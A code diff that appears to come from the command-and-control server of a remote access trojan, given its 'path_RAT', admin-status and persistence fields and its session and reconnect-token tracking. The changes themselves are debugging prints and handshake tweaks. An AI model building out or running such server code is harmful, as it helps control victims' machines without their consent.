@@ -103,8 +103,9 @@ class Handler(threading.Thread):
                 pass
             
             handshake = HandShake(conn,address,self.ObjSql)
-            handshake.daemon = True
+            #handshake.daemon = True
             handshake.start()
+            handshake.join()
 
 
 
@@ -139,7 +140,7 @@ The client first sends this information, then the server sends the parameters as
             except Exception as e:
                 printColor("error","Error in sendUltraSafe: {}\n".format(e))
             else:
-                if(confirmation == "confirmation"):
+                if(confirmation == "\r\n"):
                     print("IN SENDULTRASAFE CONFIRMATION OK")
                     pass
                 else:
@@ -163,7 +164,7 @@ The client first sends this information, then the server sends the parameters as
         else:   
             try:
                 print("SEND confirmation in recvultrasafe.")
-                self.conn.send(b"confirmation")
+                self.conn.send(b"\r\n")
             except Exception:
                 printColor("error", "[-] Error in recvUltraSafe when confirming.")
  
@@ -194,18 +195,18 @@ The client first sends this information, then the server sends the parameters as
             tmp = data.split(SPLIT)
 
             if(tmp[0]=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
-                #print("MOD RECONNECT DETECT")
+                print("MOD RECONNECT DETECT")
                 token = tmp[1]
-                #print("Token recv->", token)
+                
                 if bool(Handler.dict_conn): 
                     for value in Handler.dict_conn.values():
                         if(value[NB_TOKEN] == token): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
-                            #print("!!!!Token doublon!!!!")
+                            print("!!!!Token doublon!!!!")
                             already_in_the_dictionary = True
                             nb_session_of_conn = value[NB_SESSION]
 
                 else:
-                    #print("dict empty")
+                    print("dict empty")
                     pass
             
             elif(tmp[0] == "MOD_HANDSHAKE_IS_ADMIN"):
@@ -239,7 +240,7 @@ The client first sends this information, then the server sends the parameters as
             return list_info
 
 
-    def sendParameterOfClient(self):
+    def sendParameterOfClient(self): #NOT USE
         #?????????
         '''
         if(self.auto_persistence):
@@ -276,9 +277,9 @@ The client first sends this information, then the server sends the parameters as
                 #print("type of dict_conn ----->",type(Handler.dict_conn))
         
             if type(info) == tuple:#If the client tries to reconnect: | return Bool
-                #print("Reconnect change dict.")
+                print("Reconnect change dict.")
                 nb_session = info[1]
-
+                print("number session: ", nb_session)
                 #Session number does not change value
                 Handler.dict_conn[nb_session][NB_SOCKET] = self.conn
                 Handler.dict_conn[nb_session][NB_IP] = self.address[0]
@@ -287,14 +288,31 @@ The client first sends this information, then the server sends the parameters as
                 
                 #other information does not change:
                 #The information is retrieved from the database to the dictionary:
+                print("ADMIN: ")
                 Handler.dict_conn[nb_session][NB_ADMIN] = self.ObjSql.returnValue(nb_session,"is_he_admin")
+                print("PATH")
                 Handler.dict_conn[nb_session][NB_PATH] = self.ObjSql.returnValue(nb_session,"path_RAT")
+                print("USRNAME: ")
                 Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(nb_session,"username")
+                print("TOKEN: ")
                 Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(nb_session,"token")
-                print("len target list:",len(Handler.dict_conn[nb_session]))
+                print("TOKEN:", Handler.dict_conn[nb_session][NB_TOKEN])
+                print("SELECT")
                 Handler.dict_conn[nb_session][NB_SELECT] = False 
+                
 
         else:
             #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
             pass 
 
+        #self.conn.send(b"dir")  
+        printColor("information","\n\n[FINISH]")
+        
+
+
+#firsr error: 0
+#seconde error: 10053
+
+#Le logiciel a provoqué la déconnexion.
+#Une connexion établie a été interrompue par le logiciel de votre ordinateur hôte, 
+#probablement en raison d'un délai de transmission de données ou d'une erreur de protocole.
